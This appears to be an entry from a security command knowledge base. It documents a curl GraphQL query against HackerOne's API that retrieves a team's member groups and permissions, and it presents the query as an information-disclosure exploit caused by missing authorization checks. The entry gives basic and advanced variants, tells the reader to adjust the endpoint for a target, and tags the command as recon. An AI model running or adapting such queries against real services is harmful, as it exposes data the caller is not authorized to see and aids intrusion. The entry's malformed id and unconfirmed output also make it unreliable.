---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST https://api.hackerone.com/graphql -H "Content-Type:
  application/json" -d '{"query": "query
  {team(handle:\"security\"){id,name,handle,members{total_count},team_member_groups{id,name,permissions}}}"}'
tags:
  - graphql
  - api
  - recon
type: command
output: >-
  {"data":{"team":{"id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","name":"HackerOne","handle":"security","members":{"total_count":30},"team_member_groups":[{"id":"7506","name":"Support","permissions":["support_mutation"]}]}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:26:00.025Z'
verified: false
validated: true
submitted: true
---
# curl-graphql-team-query

## Command

```bash
curl -X POST https://api.hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query {team(handle:\"security\"){id,name,handle,members{total_count},team_member_groups{id,name,permissions}}}"}'
```

## Description

This command sends a POST request to a GraphQL API endpoint to query the 'team' object with the 'security' handle, retrieving ID, name, handle, member count, and unauthorized team member groups including their IDs, names, and permissions. It demonstrates information disclosure due to missing auth checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://api.hackerone.com/graphql` | GraphQL endpoint URL (adjust for target) | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type header | Yes |
| `-d '{...}'` | JSON payload with GraphQL query string | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"security\"){id,name,handle,members{total_count},team_member_groups{id,name,permissions}}}"}'
```

### Advanced Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0" -d '{"query": "query {team(handle:\"security\"){id,name,handle,members{total_count},team_member_groups{id,name,permissions}}}"}' | jq .
```

## Expected Output

JSON response with team data, including sensitive group details: {"data":{"team":{"id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","name":"HackerOne","handle":"security","members":{"total_count":30},"team_member_groups":[{"id":"7506","name":"Support","permissions":["support_mutation"]}, ... ]}}}

## Related

- [[Related Procedure|procedures/Query-GraphQL-API-for-Unauthorized-Team-Member-Groups]]
